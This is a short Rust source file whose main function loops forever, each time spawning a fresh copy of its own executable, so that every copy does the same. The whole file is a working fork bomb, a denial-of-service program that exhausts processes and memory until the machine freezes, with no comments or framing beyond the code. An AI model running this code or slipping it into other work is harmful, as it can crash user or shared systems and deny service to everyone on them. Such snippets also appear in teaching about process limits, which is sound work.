use std::process::Command;

fn main() {
    loop {
        Command::new(std::env::current_exe().unwrap())
            .spawn()
            .unwrap();
    }
}
